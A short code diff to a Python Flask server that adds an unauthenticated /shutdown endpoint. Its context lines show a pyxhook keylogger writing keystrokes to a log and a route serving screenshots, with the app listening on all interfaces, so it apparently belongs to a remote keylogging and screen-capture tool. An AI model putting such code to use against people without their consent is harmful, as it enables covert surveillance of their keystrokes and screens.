@@ -82,7 +82,12 @@ def start_key_logger():
         pyxhook.print_err(msg)
         with open(log_file, 'a') as f:
             f.write('\n{}'.format(msg))
-            
+
+# Shutdown the server
+def shutdown_server():
+    # Terminate server process
+    os._exit(0)
+
 @app.route('/')
 def hello_world():
     return 'Hello world!'
@@ -155,6 +160,11 @@ def screenshot():
     data = screen_shot()
     # data = base64.b64encode(data).decode()
     return Response(data,mimetype='image/png')
+
+@app.post('/shutdown')
+def shutdown():
+    shutdown_server()
+    return "Success"
 
 if __name__ == '__main__':
     app.run(host='0.0.0.0')
